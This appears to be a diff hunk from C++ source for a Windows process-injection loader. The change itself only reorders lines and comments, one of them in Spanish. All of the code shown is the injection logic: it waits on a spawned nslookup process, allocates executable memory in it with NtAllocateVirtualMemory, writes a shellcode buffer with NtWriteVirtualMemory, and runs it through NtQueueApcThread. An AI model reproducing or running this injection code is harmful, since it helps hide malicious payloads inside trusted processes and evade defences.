@@ -49,15 +49,15 @@ int main()
         std::cout << "FAILED" << errval << std::endl;
     }
     
-
+    // LOW LEVEL VARIABLES:
     LARGE_INTEGER timeout;
     timeout.QuadPart = Int32x32To64(-4, 1000 * 1000 * 10); // Le damos 4 segundos.
-    NtWaitForSingleObject(pi.hProcess, FALSE, &timeout); // Allow nslookup 4 second to start/initialize. 
     hProcess = pi.hProcess;
     hThread = pi.hThread;
-
-    // LOW LEVEL API:
     allocation_start = nullptr;
+    
+    // LOW LEVEL API:
+    NtWaitForSingleObject(pi.hProcess, FALSE, &timeout); // Allow nslookup 4 second to start/initialize.
     NtAllocateVirtualMemory(pi.hProcess, &allocation_start, 0, (PSIZE_T)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     NtWriteVirtualMemory(pi.hProcess, allocation_start, shellcode, sizeof(shellcode), 0);
     NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)allocation_start, allocation_start, NULL, NULL);
